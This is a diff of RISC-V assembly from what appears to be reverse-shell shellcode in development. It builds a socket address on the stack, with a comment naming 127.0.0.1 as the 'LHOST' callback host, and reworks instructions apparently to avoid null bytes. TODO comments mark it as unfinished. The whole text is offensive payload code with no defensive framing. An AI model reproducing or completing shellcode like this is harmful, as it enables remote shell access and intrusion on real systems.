@@ -88,8 +88,9 @@ _start:
 	###
 	addi sp,sp,-4
 	xor a3,a7,a7
-	addi a3,a6,0x0073
-	sd a3,0(sp) #<
+	xor a6,a7,a7
+	addi a6,a6,0x0073
+	sd a6,0(sp)
 	xor a3,a7,a7
 	li a3,0x8067 #<
 	sd a3,4(sp)
@@ -113,7 +114,10 @@ _start:
 	li a7,0x100007f #127.0.0.1 - LHOST, this will need some logic too fix the fact that null's can exist
 	sd a7,4(sp)
 	xor a1,a7,a7
-	or a1,a1,sp #TODO sp seems to break or
+	xori a1,sp,0x010
+	addi a1,a1,0x010
+	#TODO
+	#or a1,a1,sp #TODO sp seems to break or
 	#a2 is already 0 from above
 	addi a2,a2,0xf0
 	addi a2,a2,-0xe0
